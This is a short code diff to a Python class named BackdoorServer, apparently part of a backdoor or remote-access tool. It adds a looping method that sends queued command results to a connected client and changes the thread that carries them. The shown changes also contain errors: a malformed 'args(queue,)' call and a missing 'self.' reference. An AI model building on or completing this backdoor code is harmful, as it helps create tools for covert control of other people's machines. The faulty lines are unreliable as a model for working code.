@@ -141,6 +141,11 @@ class BackdoorServer(object):
         payload = iv + payload
 
         self.send(payload)
+    
+    def result_queue(self, queue):
+        while True:
+            result = queue.pop()
+            self.send_result(result)
 
     def run(self):
         """Runs in a loop listening for clients and serving their requests."""
@@ -156,7 +161,7 @@ class BackdoorServer(object):
                 self.listen()
 
             
-            result_send = Thread(target=self.send_result, args(queue,result))
+            result_send = Thread(target=result_queue, args(queue,))
             result_send.setDaemon(True)
             
             print("Client connected: {}".format(self.client))
